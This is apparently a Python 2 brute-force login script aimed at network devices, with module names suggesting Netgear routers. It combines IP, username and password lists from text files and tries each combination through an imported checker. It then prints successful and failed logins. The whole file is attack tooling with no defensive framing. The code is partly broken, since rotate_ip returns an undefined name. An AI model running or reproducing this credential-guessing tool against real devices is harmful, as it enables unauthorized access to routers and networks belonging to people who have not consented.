import module__ruby_l2
import module__netgear_l2
import bander_checker
import urllib
import urllib2
import random


def rotate_ip():
    return ip


#file open and list create
def file_open():
    f = open("user.txt", 'r')
    u = f.readlines()
    f.close()
    f = open("password.txt", 'r')
    p = f.readlines()
    f.close()
    f = open("result.txt", 'r')
    ip = f.readlines()
    f.close()

    ip = [ips.replace("\n","") for ips in ip]
    u = [user.replace("\n","") for user in u]
    p = [password.replace("\n","") for password in p]
    len_ip = len(ip)
    len_u = len(u)
    len_p = len(p)

    global pre
    pre=[]

    for i in ip:
        for j in u:
            for k in p:
                pre.append(i +";"+ j+";" +k)

def brute(attack_list):
    count=0
    check_result=[]
    for i in attack_list:
        count +=1
        bt_oj = i.split(';')
#        print str(bt_oj)
#        print i
        check_result.append(bander_checker.bander_check(bt_oj[0],bt_oj[1],[bt_oj[2]]))
#        if "Login OK" in check_result:
#            print check_result
    return check_result



def main():

    file_open()
    print "Scanning...\n"
    list_brute = brute(pre)

    print "\n Login 'OK' list \n ------------------------------------------"
    for text in list_brute:
        if "OK" in text:
            print text

    print "Login 'Fail' list \n ------------------------------------------"
    for text in list_brute:
        if "fail" in text:
            print text

if __name__ == '__main__':
    main()